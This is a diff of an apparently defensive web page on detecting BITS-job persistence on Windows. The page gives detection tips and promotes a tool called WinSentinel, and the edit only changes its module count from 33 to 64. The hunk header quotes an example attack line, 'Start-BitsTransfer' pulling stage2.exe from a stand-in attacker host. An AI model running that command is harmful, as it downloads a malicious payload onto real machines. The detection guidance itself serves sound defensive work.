@@ -131,7 +131,7 @@ Start-BitsTransfer -Source http://attacker.example/stage2.exe `
       <li><strong>Check retry windows:</strong> a job with an abnormally long <code>JobPriority</code> lifetime or a tiny <code>MinRetryDelay</code> is engineered for persistence, not for a real download.</li>
     </ul>
     <blockquote>Rule of thumb: legitimate BITS jobs are transient and owned by service installers or Windows Update. A job that has lived across multiple reboots, is owned by an interactive user, and carries a notify command is persistence until proven otherwise.</blockquote>
-    <p>WinSentinel runs this exact enumeration as part of its persistence and living-off-the-land audit surface — every one of the tool's 33 modules is available free on a single machine with no cap. It flags BITS jobs with notify commands, non-Microsoft sources, and long retry windows, then explains why each one is suspicious and how to remove it (<code>bitsadmin /cancel &lt;job&gt;</code> or <code>Remove-BitsTransfer</code>).</p>
+    <p>WinSentinel runs this exact enumeration as part of its persistence and living-off-the-land audit surface — every one of the tool's 64 modules is available free on a single machine with no cap. It flags BITS jobs with notify commands, non-Microsoft sources, and long retry windows, then explains why each one is suspicious and how to remove it (<code>bitsadmin /cancel &lt;job&gt;</code> or <code>Remove-BitsTransfer</code>).</p>
 
     <h2>Hardening and detection that actually holds</h2>
     <ol>
